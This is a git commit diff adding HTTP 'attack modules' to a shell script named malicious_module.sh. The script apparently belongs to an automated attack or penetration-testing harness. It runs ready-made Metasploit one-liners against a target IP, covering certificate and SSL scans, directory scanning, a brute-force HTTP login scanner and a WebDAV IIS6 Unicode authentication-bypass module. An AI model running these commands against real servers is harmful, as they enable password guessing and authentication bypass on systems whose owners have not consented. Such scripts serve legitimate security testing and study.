6ae31bc0f1a41662f227bb87d7dfe0fa73cb12b1
Arun Natarajan <arunkmr492@gmail.com>
2018-08-13 11:59:36 +0100

    added more http attack modules

--- malicious_module.sh
+++ malicious_module.sh
@@ -13,8 +13,28 @@ echo "$(timestamp) - Start Attack #1{attack_name_placeholder}"
 WP_IP=$1
 
 echo "wp variable -- $WP_IP -- $1"
+
+#check whether or not server certificates are expired.
+msfconsole -q -x "use auxiliary/scanner/http/cert; set RHOSTS $WP_IP; run; exit;"
+
+#SSL
+#queries a host or range of hosts and pull the SSL certificate information if present.
+msfconsole -q -x "use auxiliary/scanner/http/ssl; set RHOSTS $WP_IP; run; exit;"
+
+#http_login
+#brute-force login scanner that attempts to authenticate to a system using HTTP authentication.
+#To configure the module, set the AUTH_URI setting to the path of the page requesting authentication.
+msfconsole -q -x "use auxiliary/scanner/http/http_login; set AUTH_URI /xampp/; set RHOSTS $WP_IP; set VERBOSE false; run; exit;"
+
 #Directory listing
 msfconsole -q -x "use auxiliary/scanner/http/dir_scanner; set RHOSTS $WP_IP; run; exit;"
 
-#2 Arachni web testing
-# /root/Documents/arachni-security-test/bin/arachni "$WP_APP_URL"
+#Dir scanner
+msfconsole -q -x "use auxiliary/scanner/http/dir_scanner; set RHOSTS $WP_IP; run; exit;"
+
+#dir_webdav_unicode_bypass
+#attempts to bypass the authentication using the WebDAV IIS6 Unicode vulnerability.
+msfconsole -q -x "use auxiliary/scanner/http/dir_webdav_unicode_bypass; set RHOSTS $WP_IP; run; exit;"
+
+# Arachni web testing
+#/root/Documents/arachni-security-test/bin/arachni "$WP_APP_URL"
